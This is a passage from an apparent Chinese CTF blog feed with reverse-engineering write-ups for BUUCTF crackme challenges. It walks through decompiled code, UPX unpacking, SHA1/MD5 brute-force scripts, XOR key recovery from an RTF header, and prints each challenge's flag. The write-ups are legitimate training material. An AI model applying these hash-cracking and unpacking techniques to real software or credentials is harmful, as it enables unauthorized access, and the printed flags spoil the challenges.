s[12] + s[13] + s[14] + s[15] + s[16] + s[17] + s[18] + s[19] + s[20] + s[21] + s[22] + s[23] + s[24] + s[25] + s[26] + s[27] + s[28] + s[29] + s[30] + s[31] == counts)for i in range(len(numorchar)):    if numorchar[i] == 0xff:        solver.add(s[i] &gt;= ord(&#39;0&#39;))        solver.add(s[i] &lt;= ord(&#39;9&#39;))    else:        solver.add(s[i] &gt;= ord(&#39;a&#39;))        solver.add(s[i] &lt;= ord(&#39;f&#39;))    solver.add(s[i] != ord(&#39;3&#39;))# 每个字符出现的次数##       0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f#num = [0x3, 0x2, 0x2, 0x0, 0x3, 0x2, 0x1, 0x3, 0x3, 0x1, 0x1, 0x3, 0x1, 0x2, 0x2, 0x3]solver.add(s[1] == ord(&#39;f&#39;))solver.add(s[5] == ord(&#39;8&#39;))solver.add(s[6] == ord(&#39;7&#39;))solver.add(s[17] == ord(&#39;2&#39;))solver.add(s[25] == ord(&#39;4&#39;))solver.add(s[31] == ord(&#39;5&#39;))# 爆破一位solver.add(s[13] == ord(&#39;9&#39;))for i in range(len(numorchar)):    if i != 13:        solver.add(s[i] != ord(&#39;9&#39;))solver.add(s[30] == ord(&#39;a&#39;))for i in range(len(numorchar)):    if i != 30:        solver.add(s[i] != ord(&#39;a&#39;))solver.add(s[2] == ord(&#39;2&#39;))for i in range(len(numorchar)):    if i != 2 and i != 17:        solver.add(s[i] != ord(&#39;2&#39;))# 爆破二位solver.add(s[7] == ord(&#39;7&#39;))solver.add(s[9] == ord(&#39;7&#39;))for i in range(len(numorchar)):    if i != 6 and i != 7 and i!=9:        solver.add(s[i] != ord(&#39;7&#39;))solver.add(s[19] == ord(&#39;8&#39;))solver.add(s[28] == ord(&#39;8&#39;))for i in range(len(numorchar)):    if i != 5 and i != 19 and i!=28:        solver.add(s[i] != ord(&#39;8&#39;))solver.add(s[18] == ord(&#39;f&#39;))solver.add(s[21] == ord(&#39;f&#39;))for i in range(len(numorchar)):    if i != 1 and i != 21 and i!=18:        solver.add(s[i] != ord(&#39;f&#39;))solver.add(s[4] == ord(&#39;4&#39;))solver.add(s[29] == ord(&#39;4&#39;))for i in range(len(numorchar)):    if i != 25 and i != 4 and i!=29:        solver.add(s[i] != ord(&#39;4&#39;))# 剩下的一位和二位都是多解# 6 在 22 27# c 在 11 15# 5 在 22 27# 1 在 10 14# 1 在 10 24# 1 在 10 27# 1 在 14 23# d 在 0 12# d 在 0 20# e 在 8 12# e 在 8 20# e 在 11 12# e 在 11 20# 0 在 10 16 24# 0 在 14 16 23# 0 在 16 23 24# 0 在 23 16 24# b 在 3 11 26# b 在 3 15 26# 爆破 循环#for i in range(0,len(s)):#    if i == buf or i == buf1 or i == buf2:#        solver.add(s[i] == ord(&#39;b&#39;))#    else:#        solver.add(s[i] != ord(&#39;b&#39;))if solver.check() == z3.sat:    solvers = solver.model()    for i in range(0,len(solvers)):        print(solvers[s[i]],&quot;,&quot;,end=&quot;&quot;)# 100 ,102 ,50 ,98 ,52 ,56 ,55 ,55 ,101 ,55 ,49 ,98 ,100 ,57 ,49 ,99 ,48 ,50 ,102 ,56 ,101 ,102 ,54 ,48 ,48 ,52 ,98 ,53 ,56 ,52 ,97 ,53# df2b4877e71bd91c02f8ef6004b584a5</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;伪代码分析&quot;&gt;&lt;a href=&quot;#伪代码分析&quot; class=&quot;headerlink&quot; title=&quot;伪代码分析&quot;&gt;&lt;/a&gt;伪代码分析&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;signed __int64 __fastcall main(int a1, c
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="writeup" scheme="https://bufsnake.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="https://bufsnake.github.io/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html"/>
    <id>https://bufsnake.github.io/BUUCTF刷题记录.html</id>
    <published>2020-04-30T05:30:49.000Z</published>
    <updated>2020-04-30T05:38:24.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>ida F5得到伪代码</p><p><img src="/images/BUUCTF-RE.assets/image-20200427142729388.png" srcset="/img/loading.gif" alt="image-20200427142729388"></p><p>查看字符串，得到一串特殊字符</p><p><img src="/images/BUUCTF-RE.assets/image-20200427142748004.png" srcset="/img/loading.gif" alt="image-20200427142748004"></p><p>长度为25，综合考虑了一下，发现考点为”迷宫”</p><pre><code class="python">*11110100001010000101111#</code></pre><p>输入一下代码</p><p><code>222441144222</code></p><p>可以得到</p><p><img src="/images/BUUCTF-RE.assets/image-20200427144407701.png" srcset="/img/loading.gif" alt="image-20200427144407701"></p><p>flag为:flag{222441144222}</p><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>首先分析一下sub_40100A函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429090809250.png" srcset="/img/loading.gif" alt="image-20200429090809250"></p><p>打开后发现调用的是sub_401230函数，接下来分析sub_401230函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429090905109.png" srcset="/img/loading.gif" alt="image-20200429090905109"></p><pre><code class="c">// 主要函数 BOOL CryptCreateHash(  HCRYPTPROV hProv,  ALG_ID     Algid,  // 指定加密的密码 这里 0x8004 指定的是sha1  HCRYPTKEY  hKey,  DWORD      dwFlags,  HCRYPTHASH *phHash);</code></pre><p>对照表如下</p><table><thead><tr><th>0x00006603</th><th style="text-align:left">CALG_3DES</th></tr></thead><tbody><tr><td>0x00006609</td><td style="text-align:left">CALG_3DES_112</td></tr><tr><td>0x00006611</td><td style="text-align:left">CALG_AES</td></tr><tr><td>0x0000660e</td><td style="text-align:left">CALG_AES_128</td></tr><tr><td>0x0000660f</td><td style="text-align:left">CALG_AES_192</td></tr><tr><td>0x00006610</td><td style="text-align:left">CALG_AES_256</td></tr><tr><td>0x0000aa03</td><td style="text-align:left">CALG_AGREEDKEY_ANY</td></tr><tr><td>0x0000660c</td><td style="text-align:left">CALG_CYLINK_MEK</td></tr><tr><td>0x00006601</td><td style="text-align:left">CALG_DES</td></tr><tr><td>0x00006604</td><td style="text-align:left">CALG_DESX</td></tr><tr><td>0x0000aa02</td><td style="text-align:left">CALG_DH_EPHEM</td></tr><tr><td>0x0000aa01</td><td style="text-align:left">CALG_DH_SF</td></tr><tr><td>0x00002200</td><td style="text-align:left">CALG_DSS_SIGN</td></tr><tr><td>0x0000aa05</td><td style="text-align:left">CALG_ECDH</td></tr><tr><td>0x0000ae06</td><td style="text-align:left">CALG_ECDH_EPHEM</td></tr><tr><td>0x00002203</td><td style="text-align:left">CALG_ECDSA</td></tr><tr><td>0x0000a001</td><td style="text-align:left">CALG_ECMQV</td></tr><tr><td>0x0000800b</td><td style="text-align:left">CALG_HASH_REPLACE_OWF</td></tr><tr><td>0x0000a003</td><td style="text-align:left">CALG_HUGHES_MD5</td></tr><tr><td>0x00008009</td><td style="text-align:left">CALG_HMAC</td></tr><tr><td>0x0000aa04</td><td style="text-align:left">CALG_KEA_KEYX</td></tr><tr><td>0x00008005</td><td style="text-align:left">CALG_MAC</td></tr><tr><td>0x00008001</td><td style="text-align:left">CALG_MD2</td></tr><tr><td>0x00008002</td><td style="text-align:left">CALG_MD4</td></tr><tr><td>0x00008003</td><td style="text-align:left">CALG_MD5</td></tr><tr><td>0x00002000</td><td style="text-align:left">CALG_NO_SIGN</td></tr><tr><td>0xffffffff</td><td style="text-align:left">CALG_OID_INFO_CNG_ONLY</td></tr><tr><td>0xfffffffe</td><td style="text-align:left">CALG_OID_INFO_PARAMETERS</td></tr><tr><td>0x00004c04</td><td style="text-align:left">CALG_PCT1_MASTER</td></tr><tr><td>0x00006602</td><td style="text-align:left">CALG_RC2</td></tr><tr><td>0x00006801</td><td style="text-align:left">CALG_RC4</td></tr><tr><td>0x0000660d</td><td style="text-align:left">CALG_RC5</td></tr><tr><td>0x0000a400</td><td style="text-align:left">CALG_RSA_KEYX</td></tr><tr><td>0x00002400</td><td style="text-align:left">CALG_RSA_SIGN</td></tr><tr><td>0x00004c07</td><td style="text-align:left">CALG_SCHANNEL_ENC_KEY</td></tr><tr><td>0x00004c03</td><td style="text-align:left">CALG_SCHANNEL_MAC_KEY</td></tr><tr><td>0x00004c02</td><td style="text-align:left">CALG_SCHANNEL_MASTER_HASH</td></tr><tr><td>0x00006802</td><td style="text-align:left">CALG_SEAL</td></tr><tr><td>0x00008004</td><td style="text-align:left">CALG_SHA</td></tr><tr><td>0x00008004</td><td style="text-align:left">CALG_SHA1</td></tr><tr><td>0x0000800c</td><td style="text-align:left">CALG_SHA_256</td></tr><tr><td>0x0000800d</td><td style="text-align:left">CALG_SHA_384</td></tr><tr><td>0x0000800e</td><td style="text-align:left">CALG_SHA_512</td></tr><tr><td>0x0000660a</td><td style="text-align:left">CALG_SKIPJACK</td></tr><tr><td>0x00004c05</td><td style="text-align:left">CALG_SSL2_MASTER</td></tr><tr><td>0x00004c01</td><td style="text-align:left">CALG_SSL3_MASTER</td></tr><tr><td>0x00008008</td><td style="text-align:left">CALG_SSL3_SHAMD5</td></tr><tr><td>0x0000660b</td><td style="text-align:left">CALG_TEK</td></tr><tr><td>0x00004c06</td><td style="text-align:left">CALG_TLS1_MASTER</td></tr><tr><td>0x0000800a</td><td style="text-align:left">CALG_TLS1PRF</td></tr></tbody></table><p>所以密码1可爆破，但是直接找个在线的网站也解出来了，爆破截包如下：</p><pre><code class="python">import hashlibfor i in range(100000,999999):    if hashlib.sha1((str(i) + &#39;@DBApp&#39;).encode(&#39;utf-8&#39;)).hexdigest().upper() == &#39;6E32D0943418C2C33385BC35A1470250DD8923A9&#39;:        print(str(i))// 123321   密码1为 123321</code></pre><p>继续往下分析，密码2为6位，未指定范围，sub_401019函数也是个hash加密，指向的是MD5加密，可以爆破可见字符.</p><p><img src="/images/BUUCTF-RE.assets/image-20200429092130004.png" srcset="/img/loading.gif" alt="image-20200429092130004"></p><p>硬盘够大，时间够多的情况下还是可以的。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093343379.png" srcset="/img/loading.gif" alt="image-20200429093343379"></p><p>无奈，只能继续往下分析</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093453782.png" srcset="/img/loading.gif" alt="image-20200429093453782"></p><p>这里sub_40100F函数使用了密码2，而且会根据密码2来判断是否退出程序，所以，应该是解出密码2的关键点。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429093701931.png" srcset="/img/loading.gif" alt="image-20200429093701931"></p><p>分析一波函数</p><pre><code class="go">HRSRC FindResourceA(  HMODULE hModule,   LPCSTR  lpName,  LPCSTR  lpType); // 在程序的资源列表里打开类型为lpType，名称为lpName的资源。</code></pre><p>分析程序得到</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094408594.png" srcset="/img/loading.gif" alt="image-20200429094408594"></p><p>关键点在sub_401005函数，分析它：</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094527735.png" srcset="/img/loading.gif" alt="image-20200429094527735"></p><p>表示将资源的数据逐字节的与(密码二+密码一+@DBApp)循环xor。</p><p>查看资源，0x65 = 101</p><p><img src="/images/BUUCTF-RE.assets/image-20200429094834994.png" srcset="/img/loading.gif" alt="image-20200429094834994"></p><p>资源有了，密码2为6位由用户输入，该输入啥呢。</p><p>可以看到因为创建的文件为rtf格式，所以文件头是固定的，所以，可以查看rtf的文件头格式，只需要前6位，搜索得到文件头前六位为<code>7B5C72746631</code>与资源的前6个字节xor得到密码二<code>~!3a@0</code></p><p>密码1: 123321</p><p>密码2: ~!3a@0</p><p>解密得到文件，打开即是flag{N0_M0re_Free_Bugs}</p><h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p><img src="/images/BUUCTF-RE.assets/image-20200429103020976.png" srcset="/img/loading.gif" alt="image-20200429103020976"></p><pre><code class="python">输入长度为32第31个为a第一个为b第0+第2 - 48 = 56</code></pre><p>继续往下分析，发现用户输入的只是用来更改flag标志，并没有参与flag加密，所以直接copy代码</p><pre><code class="java">public class A {    public static void main(String[] args) {        char[] x = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray();        x[2] = (char) ((x[2] + x[3]) - 50);        x[4] = (char) ((x[2] + x[5]) - 48);        x[30] = (char) ((x[31] + x[9]) - 48);        x[14] = (char) ((x[27] + x[28]) - 97);        for (int i = 0; i &lt; 16; i++) {            char a = x[31 - i];            x[31 - i] = x[i];            x[i] = a;        }        System.out.println(&quot;flag{&quot; + String.valueOf(x) + &quot;}&quot;);    }}// flag{59acc538825054c7de4b26440c0999dd}</code></pre><h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><pre><code class="bash">└&gt; file luck_guyluck_guy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=38f6b7066f73e3b41dca3ab5b6da405f8edf2ec5, not stripped</code></pre><p>64位，Linux可执行文件</p><p><img src="/images/BUUCTF-RE.assets/image-20200429104857439.png" srcset="/img/loading.gif" alt="image-20200429104857439"></p><ol><li><p>输入数字调用patch_me</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105043506.png" srcset="/img/loading.gif" alt="image-20200429105043506"></p></li><li><p>分析patch_me，输入为偶数调用get_flag</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105113603.png" srcset="/img/loading.gif" alt="image-20200429105113603"></p></li><li><p>输入偶数试试，发现他在骗我…</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105203757.png" srcset="/img/loading.gif" alt="image-20200429105203757"></p></li><li><p>分析get_flag</p><p><img src="/images/BUUCTF-RE.assets/image-20200429105334001.png" srcset="/img/loading.gif" alt="image-20200429105334001"></p><p>循环四次，由随机数分发，有一定几率拿到flag。</p><p>在分支1中是可以得到flag的：flag由f1和f2组成。</p><p>在分支2和分支3中都是错误的。</p><p>在分支4中给f2赋值。</p><p>在分支5中操作f2。</p><p>默认输出错误。</p></li><li><p>由此，可以推断，执行流，4，5，1.</p><pre><code class="python">In [1]: flag = &#39;7F666F6067756369&#39;In [2]: s = &#39;&#39;   ...: for i in range(0,len(flag),2):   ...:     s += chr(int(flag[i:i+2],16))   ...:In [3]: s = list(s)In [4]: s.reverse()In [5]: sOut[5]: [&#39;i&#39;, &#39;c&#39;, &#39;u&#39;, &#39;g&#39;, &#39;`&#39;, &#39;o&#39;, &#39;f&#39;, &#39;\x7f&#39;]In [6]: flag = &#39;&#39;   ...: pre = &#39;GXY{do_not_&#39;   ...: for i in range(0,8):   ...:     if i % 2 == 1:   ...:         flag += chr(ord(s[i]) - 2)   ...:     else:   ...:         flag += chr(ord(s[i]) - 1)   ...: print(pre+flag)GXY{do_not_hate_me}</code></pre></li></ol><h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>查壳，upx壳</p><p><img src="/images/BUUCTF-RE.assets/image-20200429111813488.png" srcset="/img/loading.gif" alt="image-20200429111813488"></p><p>脱壳</p><p><img src="/images/BUUCTF-RE.assets/image-20200429111944821.png" srcset="/img/loading.gif" alt="image-20200429111944821"></p><p>分析，反调试还挺多的</p><p><img src="/images/BUUCTF-RE.assets/image-20200429112224296.png" srcset="/img/loading.gif" alt="image-20200429112224296"></p><p>分析程序Source是全局变量，由用户输入</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113115925.png" srcset="/img/loading.gif" alt="image-20200429113115925"></p><p>用户输入的数据copy到Dest，创建了两个线程StartAddress和sub_41119F</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113203312.png" srcset="/img/loading.gif" alt="image-20200429113203312"></p><p>查看线程StartAddress</p><p>主要作用是对Source加密</p><p><img src="/images/BUUCTF-RE.assets/image-20200429125136740.png" srcset="/img/loading.gif" alt="image-20200429125136740"></p><p>查看线程sub_41119F</p><p><img src="/images/BUUCTF-RE.assets/image-20200429125239913.png" srcset="/img/loading.gif" alt="image-20200429125239913"></p><p>对数字dword_418008进行减一操作</p><p>回过头看加密函数</p><p>反编译，发现堆栈不平衡错误，修复之后</p><p><img src="/images/BUUCTF-RE.assets/image-20200429114403280.png" srcset="/img/loading.gif" alt="image-20200429114403280"></p><p>分析</p><p><img src="/images/BUUCTF-RE.assets/image-20200429120908393.png" srcset="/img/loading.gif" alt="111"></p><p>所以线程一的作用为：对用户输入的字符逐字节加密，数组下标减一，睡眠0.1s</p><p>线程二的作用为：数组下标减一，睡眠0.1s</p><p>所以，综合作用就是对用户输入的字符逐字节加密，数组下标减二</p><p><img src="/images/BUUCTF-RE.assets/image-20200429113224171.png" srcset="/img/loading.gif" alt="111"></p><p>得到加密后的字符串与off_418004出的字符串对比</p><p>脚本</p><pre><code class="python">dic = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;res = &#39;TOiZiZtOrYaToUwPnToBsOaOapsyS&#39;flag = &#39;&#39;for j in range(len(res)-1,-1,-1):    if j % 2 == 0:        flag += res[j]        continue    for i in range(64,123):        if i &lt; ord(&#39;Z&#39;):            if dic[i-38] == res[j]:                flag += chr(i)                break        elif i &gt;= ord(&#39;a&#39;):            if dic[i-96] == res[j]:                flag += chr(i)                breakflag = list(flag)flag.reverse()print(&#39;&#39;.join(i for i in flag))// ThisisthreadofwindowshahaIsES</code></pre><p>注意：Flag为flag{ThisisthreadofwindowshahaIsESE}，出题问题</p><p>题目加密部分出的很奇怪，如果我输入Z的时候，ord(‘Z’) - 38 = 52， dic[52] 会超出数组下标，程序不会会崩溃，因为他是C语言啊，作者的本意应该是输入大写字母就-97，小写字母-39，才能实现大写转成小写，小写转成大写。</p><p>总体来说：</p><p>程序输入30个字符串，从后往前每隔一位加一次密，最后与29位的字符串比较，太坑了。</p><h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><p>提取APK中完整的邮箱</p><p><img src="/images/BUUCTF-RE.assets/image-20200429140953932.png" srcset="/img/loading.gif" alt="image-20200429140953932"></p><p>在主活动中看到程序会将调试的信息显示在终端，安装程序后启动，可以使用adb获取输出的信息，包含email地址。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429141143180.png" srcset="/img/loading.gif" alt="image-20200429141143180"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429141411297.png" srcset="/img/loading.gif" alt="image-20200429141411297"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429141539042.png" srcset="/img/loading.gif" alt="image-20200429141539042"></p><p>以上应该是非预期解</p><p>分析下程序，查找和mail相关的代码，发现了下面一段代码</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142322065.png" srcset="/img/loading.gif" alt="image-20200429142322065"></p><p>分析连接的函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142421602.png" srcset="/img/loading.gif" alt="image-20200429142421602"></p><p>发现配置都定义在了C0005C2中，且有些数据时在native层。</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142516081.png" srcset="/img/loading.gif" alt="image-20200429142516081"></p><p><img src="/images/BUUCTF-RE.assets/image-20200429142750461.png" srcset="/img/loading.gif" alt="image-20200429142750461"></p><p>直接查看so库的硬编码字符串碰碰运气，可以得到邮件的base64编码</p><p><img src="/images/BUUCTF-RE.assets/image-20200429142935213.png" srcset="/img/loading.gif" alt="image-20200429142935213"></p><h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>反编译得到如下代码</p><pre><code class="python">print &#39;Welcome to Re World!&#39;print &#39;Your input1 is your flag~&#39;l = len(input1)for i in range(l):    num = ((input1[i] + i) % 128 + 128) % 128    code += numfor i in range(l - 1):    code[i] = code[i] ^ code[i + 1]print codecode = [    &#39;\x1f&#39;,    &#39;\x12&#39;,    &#39;\x1d&#39;,    &#39;(&#39;,    &#39;0&#39;,    &#39;4&#39;,    &#39;\x01&#39;,    &#39;\x06&#39;,    &#39;\x14&#39;,    &#39;4&#39;,    &#39;,&#39;,    &#39;\x1b&#39;,    &#39;U&#39;,    &#39;?&#39;,    &#39;o&#39;,    &#39;6&#39;,    &#39;*&#39;,    &#39;:&#39;,    &#39;\x01&#39;,    &#39;D&#39;,    &#39;;&#39;,    &#39;%&#39;,    &#39;\x13&#39;]</code></pre><p>solve</p><pre><code class="python">code = [&#39;\x1f&#39;,&#39;\x12&#39;,&#39;\x1d&#39;,&#39;(&#39;,&#39;0&#39;,&#39;4&#39;,&#39;\x01&#39;,&#39;\x06&#39;,&#39;\x14&#39;,&#39;4&#39;,&#39;,&#39;,&#39;\x1b&#39;,&#39;U&#39;,&#39;?&#39;,&#39;o&#39;,&#39;6&#39;,&#39;*&#39;,&#39;:&#39;,&#39;\x01&#39;,&#39;D&#39;,&#39;;&#39;,&#39;%&#39;,&#39;\x13&#39;]for i in range(len(code)-2,-1,-1):    code[i] = chr(ord(code[i]) ^ ord(code[i+1]))flag = &#39;&#39;for i in range(0,len(code)):    for j in range(0,255):        if ((j + i) % 128 + 128) % 128 == ord(code[i]):            flag += (chr(j))            breakprint(flag)// GWHT{Just_Re_1s_Ha66y!}</code></pre><h2 id="2019红帽杯-easyRE-藏函数"><a href="#2019红帽杯-easyRE-藏函数" class="headerlink" title="[2019红帽杯]easyRE-藏函数"></a>[2019红帽杯]easyRE-藏函数</h2><pre><code class="c">signed __int64 __fastcall sub_4009C6(double a1, double a2, double a3, double a4, double a5, double a6, double a7, double a8){  double v8; // xmm4_8  double v9; // xmm5_8  signed __int64 result; // rax  __int64 v11; // ST10_8  __int64 v12; // ST18_8  __int64 v13; // ST20_8  __int64 v14; // ST28_8  __int64 v15; // ST30_8  __int64 v16; // ST38_8  __int64 v17; // ST40_8  __int64 v18; // ST48_8  __int64 v19; // ST50_8  __int64 v20; // ST58_8  int i; // [rsp+Ch] [rbp-114h]  char v22; // [rsp+60h] [rbp-C0h]  char v23; // [rsp+61h] [rbp-BFh]  char v24; // [rsp+62h] [rbp-BEh]  char v25; // [rsp+63h] [rbp-BDh]  char v26; // [rsp+64h] [rbp-BCh]  char v27; // [rsp+65h] [rbp-BBh]  char v28; // [rsp+66h] [rbp-BAh]  char v29; // [rsp+67h] [rbp-B9h]  char v30; // [rsp+68h] [rbp-B8h]  char v31; // [rsp+69h] [rbp-B7h]  char v32; // [rsp+6Ah] [rbp-B6h]  char v33; // [rsp+6Bh] [rbp-B5h]  char v34; // [rsp+6Ch] [rbp-B4h]  char v35; // [rsp+6Dh] [rbp-B3h]  char v36; // [rsp+6Eh] [rbp-B2h]  char v37; // [rsp+6Fh] [rbp-B1h]  char v38; // [rsp+70h] [rbp-B0h]  char v39; // [rsp+71h] [rbp-AFh]  char v40; // [rsp+72h] [rbp-AEh]  char v41; // [rsp+73h] [rbp-ADh]  char v42; // [rsp+74h] [rbp-ACh]  char v43; // [rsp+75h] [rbp-ABh]  char v44; // [rsp+76h] [rbp-AAh]  char v45; // [rsp+77h] [rbp-A9h]  char v46; // [rsp+78h] [rbp-A8h]  char v47; // [rsp+79h] [rbp-A7h]  char v48; // [rsp+7Ah] [rbp-A6h]  char v49; // [rsp+7Bh] [rbp-A5h]  char v50; // [rsp+7Ch] [rbp-A4h]  char v51; // [rsp+7Dh] [rbp-A3h]  char v52; // [rsp+7Eh] [rbp-A2h]  char v53; // [rsp+7Fh] [rbp-A1h]  char v54; // [rsp+80h] [rbp-A0h]  char v55; // [rsp+81h] [rbp-9Fh]  char v56; // [rsp+82h] [rbp-9Eh]  char v57; // [rsp+83h] [rbp-9Dh]  char v58[32]; // [rsp+90h] [rbp-90h]  int v59; // [rsp+B0h] [rbp-70h]  char v60; // [rsp+B4h] [rbp-6Ch]  char v61; // [rsp+C0h] [rbp-60h]  char v62; // [rsp+E7h] [rbp-39h]  char v63; // [rsp+100h] [rbp-20h]  unsigned __int64 v64; // [rsp+108h] [rbp-18h]  v64 = __readfsqword(0x28u);  v22 = 73;  v23 = 111;  v24 = 100;  v25 = 108;  v26 = 62;  v27 = 81;  v28 = 110;  v29 = 98;  v30 = 40;  v31 = 111;  v32 = 99;  v33 = 121;  v34 = 127;  v35 = 121;  v36 = 46;  v37 = 105;  v38 = 127;  v39 = 100;  v40 = 96;  v41 = 51;  v42 = 119;  v43 = 125;  v44 = 119;  v45 = 101;  v46 = 107;  v47 = 57;  v48 = 123;  v49 = 105;  v50 = 121;  v51 = 61;  v52 = 126;  v53 = 121;  v54 = 76;  v55 = 64;  v56 = 69;  v57 = 67;  memset(v58, 0, sizeof(v58));  v59 = 0;  v60 = 0;  sub_4406E0(0LL, v58);  v60 = 0;  if ( sub_424BA0(v58) == 36 )  {    for ( i = 0; i &lt; sub_424BA0(v58); ++i ) // xor运算    {      if ( (v58[i] ^ i) != *(&amp;v22 + i) )      {        result = 4294967294LL;        goto LABEL_13;      }    }    sub_410CC0(&quot;continue!&quot;);    memset(&amp;v61, 0, 0x40uLL);    v63 = 0;    sub_4406E0(0LL, &amp;v61);    v62 = 0;    if ( sub_424BA0(&amp;v61) == 39 )    {      v11 = sub_400E44(&amp;v61);      v12 = sub_400E44(v11);      v13 = sub_400E44(v12);      v14 = sub_400E44(v13);      v15 = sub_400E44(v14);      v16 = sub_400E44(v15);      v17 = sub_400E44(v16);      v18 = sub_400E44(v17);      v19 = sub_400E44(v18);      v20 = sub_400E44(v19);      if ( !sub_400360(v20, off_6CC090) ) // base64运算      {        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      }      result = 0LL;    }    else    {      result = 4294967293LL;    }  }  else  {    result = 0xFFFFFFFFLL;  }LABEL_13:  if ( __readfsqword(0x28u) != v64 )    sub_444020(a1, a2, a3, a4, v8, v9, a7, a8);  return result;}</code></pre><ol><li><p>第一处加密得到的结果</p><pre><code class="bash">Info:The first four chars are `flag`</code></pre></li><li><p>第二处加密得到的结果</p><pre><code class="bash">https://bbs.pediy.com/thread-254172.htm</code></pre></li><li><p>都没啥太大的意义</p><p>一番查看，发现了在初始化段存在另外一处程序不运行的函数。</p><p><img src="/images/BUUCTF-RE.assets/image-20200430101131336.png" srcset="/img/loading.gif" alt="image-20200430101131336"></p><pre><code class="c">__int64 __fastcall sub_400D35(double a1, double a2, double a3, double a4, double a5, double a6, double a7, double a8){  double v8; // xmm4_8  double v9; // xmm5_8  __int64 result; // rax  unsigned __int64 v11; // rt1  unsigned int v12; // [rsp+Ch] [rbp-24h]  signed int i; // [rsp+10h] [rbp-20h]  signed int j; // [rsp+14h] [rbp-1Ch]  unsigned int v15; // [rsp+24h] [rbp-Ch]  unsigned __int64 v16; // [rsp+28h] [rbp-8h]  v16 = __readfsqword(0x28u);  v12 = sub_43FD20() - qword_6CEE38;  for ( i = 0; i &lt;= 1233; ++i )  {    sub_40F790(v12);    sub_40FE60();    sub_40FE60();    v12 = sub_40FE60() ^ 0x98765432;  }  v15 = v12;  if ( (v12 ^ byte_6CC0A0[0]) == 102 &amp;&amp; (HIBYTE(v15) ^ byte_6CC0A3) == 103 )  {    for ( j = 0; j &lt;= 24; ++j )      sub_410E90((byte_6CC0A0[j] ^ *(&amp;v15 + j % 4)));  }  v11 = __readfsqword(0x28u);  result = v11 ^ v16;  if ( v11 != v16 )    sub_444020(a1, a2, a3, a4, v8, v9, a7, a8);  return result;}</code></pre><p>byte_6CC0A0与byte_6CC0A3数据如下</p><pre><code class="bash">.data:00000000006CC0A0     byte_6CC0A0     db 40h                  ; DATA XREF: sub_400D35+95↑r.data:00000000006CC0A0                                             ; sub_400D35+C1↑r.data:00000000006CC0A1                     db  35h ; 5.data:00000000006CC0A2                     db  20h.data:00000000006CC0A3     byte_6CC0A3     db 56h                  ; DATA XREF: sub_400D35+A6↑r.data:00000000006CC0A4                     db  5Dh ; ].data:00000000006CC0A5                     db  18h.data:00000000006CC0A6                     db  22h ; &quot;.data:00000000006CC0A7                     db  45h ; E.data:00000000006CC0A8                     db  17h.data:00000000006CC0A9                     db  2Fh ; /.data:00000000006CC0AA                     db  24h ; $.data:00000000006CC0AB                     db  6Eh ; n.data:00000000006CC0AC                     db  62h ; b.data:00000000006CC0AD                     db  3Ch ; &lt;.data:00000000006CC0AE                     db  27h ; &#39;.data:00000000006CC0AF                     db  54h ; T.data:00000000006CC0B0                     db  48h ; H.data:00000000006CC0B1                     db  6Ch ; l.data:00000000006CC0B2                     db  24h ; $.data:00000000006CC0B3                     db  6Eh ; n.data:00000000006CC0B4                     db  72h ; r.data:00000000006CC0B5                     db  3Ch ; &lt;.data:00000000006CC0B6                     db  32h ; 2.data:00000000006CC0B7                     db  45h ; E.data:00000000006CC0B8                     db  5Bh ; [.data:00000000006CC0B9                     db    0.data:00000000006CC0BA                     db    0.data:00000000006CC0BB                     db    0.data:00000000006CC0BC                     db    0.data:00000000006CC0BD                     db    0.data:00000000006CC0BE                     db    0.data:00000000006CC0BF                     db    0</code></pre><p>主要代码如下</p><pre><code class="bash">v15 = v12;if ( (v12 ^ byte_6CC0A0[0]) == &#39;f&#39; &amp;&amp; (HIBYTE(v15) ^ byte_6CC0A3) == &#39;g&#39; ){    for ( j = 0; j &lt;= 24; ++j )        sub_410E90((byte_6CC0A0[j] ^ *(&amp;v15 + j % 4)));}假设 v12 = 0xAABBCCDD则v12 ^ byte_6CC0A0[0] == 0xDD ^ 